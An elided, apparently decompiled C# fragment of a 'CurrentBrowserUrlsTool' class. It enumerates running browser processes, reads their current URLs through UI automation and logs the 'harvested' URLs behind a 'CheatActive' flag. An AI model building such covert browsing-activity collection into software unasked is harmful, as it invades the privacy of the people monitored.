...
namespace DpvClassLibrary.Tools
{
	public static class CurrentBrowserUrlsTool
	{
				...
				foreach (KeyValuePair<string, BrowserType> browserPair in _processSearchStringsForBrowsertypes)
				{
					...
					foreach (Process item in enumerable)
					{
						if (!(item.MainWindowHandle == IntPtr.Zero))
						{
							...
							{
                                LogHarvestedURL(uRLFromProcess);
		...
		private static string GetURLFromProcess(Process process, BrowserType browser, IntPtr handle)
		{
            ...
            return BrowserHarvestURL(process, browser, handle, automationElement);
        ...
        private static void LogHarvestedURL(string uRLFromProcess)
        {
            if (!CheatActive)
            {
        ...
        private static string BrowserHarvestURL(Process process, BrowserType browser, IntPtr handle, AutomationElement automationElement)
        {
            if (!CheatActive)
            {
